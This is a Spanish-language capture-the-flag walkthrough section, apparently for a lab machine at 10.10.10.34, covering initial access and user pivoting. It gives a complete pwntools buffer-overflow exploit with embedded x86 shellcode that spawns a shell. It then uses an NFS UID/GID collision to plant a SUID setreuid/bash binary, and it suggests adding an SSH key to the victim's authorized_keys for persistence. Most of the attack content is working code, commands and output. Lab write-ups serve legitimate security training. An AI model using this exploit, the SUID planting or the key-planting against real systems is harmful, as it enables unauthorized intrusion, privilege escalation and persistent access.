## Vuln exploit & Gaining Access {-}

### Ganando accesso con el bufferoverflow {-}

1. Lanzamos el debug mode para recuperar la direccion del buffer

    ```bash
    nc 10.10.10.34 7411
    OK Ready. Send USER command.
    DEBUG
    OK DEBUG mode on.
    USER admin
    OK Send PASS command.
    PASS admin
    Debug: userpass buffer @ 0xffffd140
    ```

1. Modificamos el script en python

    ```python
    #!/usr/bin/python3

    from pwn import *

    context(os='linux', arch='i386')

    # p = remote("127.0.0.1", 7411)
    p = remote("10.10.10.34", 7411)

    buf = b"\x6a\x02\x5b\x6a\x29\x58\xcd\x80\x48\x89\xc6"
    buf += b"\x31\xc9\x56\x5b\x6a\x3f\x58\xcd\x80\x41\x80"
    buf += b"\xf9\x03\x75\xf5\x6a\x0b\x58\x99\x52\x31\xf6"
    buf += b"\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e"
    buf += b"\x89\xe3\x31\xc9\xcd\x80"


    before_eip = ("A" * 28).encode()
    EIP = p32(0xffffd140+32)
    after_eip = buf

    p.recvuntil("OK Ready. Send USER command.")
    p.sendline("USER admin")
    p.recvuntil("OK Send PASS command.")
    p.sendline("PASS ".encode() + before_eip + EIP + after_eip)

    p.interactive()
    ```

1. Lanzamos el script en python

    ```bash
    python3 exploit.py
    ```


Ya hemos ganado acceso al systema como el usuario **nobody** pero no podemos leer la flag y nos tenemos que convertir en el usuario frank.

### User pivoting {-}

```bash
id
sudo -l
```

Vemos que podemos lanzar el script `/opt/logreader/logreader.sh` como el usuario frank sin proporcionar contraseña.

```bash
cat /opt/logreader/logreader.sh
sudo -u frank /opt/logreader/logreader.sh
which strace
which ltrace
which checkproc
```

Vemos que podemos lanzar el script pero no sabemos exactamente lo que hace y no lo podemos debuggear. 

Miramos a los recursos compartidos **nfs** de la maquina

```bash
cat /etc/exports
```

Nos creamos dos monturas en nuestra maquina de atacante

```bash
mkdir /mnt/{opt,var}
cd /mnt
mount -t nfs 10.10.10.34:/opt /mnt/opt
mount -t nfs 10.10.10.34:/var/nfsshare /mnt/var
ls -l
ls -l opt/
ls -l opt/logreader
ls -l opt/rh
ls -l var/
```

Aqui vemos que no tenemos derechos de lectura ni de escritura sobre el directorio opt y var pero algo que nos llama la atencion son los user y groups asignados a estos 
directorios, sobre todo el directorio var que se nos aparece como estando del grupo docker.

```{r, echo = FALSE, fig.cap="groups nfs share folders", out.width="90%"}
    knitr::include_graphics("images/Jail-lla.png")
```

Esto suele pasar porque nuestro grupo docker en nuestra maquina de atacante tiene el mismo id que el usuario franck de la maquina victima. Esto significa que
hay una colision entre los dos grupos y que como usuario del grupo docker en nuestra maquina de atacante, podemos crear ficheros como el usuario franck de la
maquina victima

> [ ! ] NOTAS: Si no existe docker en nuestra maquina de atacante, tendriamos que ver el numero 1000 y tendriamos que crear un grupo con este id para operar

1. Creamos un fichero en C en el directorio `/mnt/var`

    ```bash
    #include <unistd.h>
    #include <stdio.h>

    int main(){
        setreuid(1000, 1000);
        system("/bin/bash");
        return 0;
    }
    ```

1. Compilamos el script

    ```bash
    gcc shell.c -o shell
    ```

1. Cambiamos el grupo y ponemos derechos SUID al binario

    ```bash
    chgrp 1000 shell
    chmod u+s shell
    ```

1. lanzamos el script desde la maquina victima

    ```bash
    ./shell
    whoami
    #Output
    frank
    ```

Ya podemos leer la flag.

> [ ! ] NOTAS: como la reverse shell no es la mejor del mundo, aqui nos podriamos crear una id_rsa y copiarla en el authorized_keys del usuario Frank para
conectarnos por ssh y obtener una mejor shell.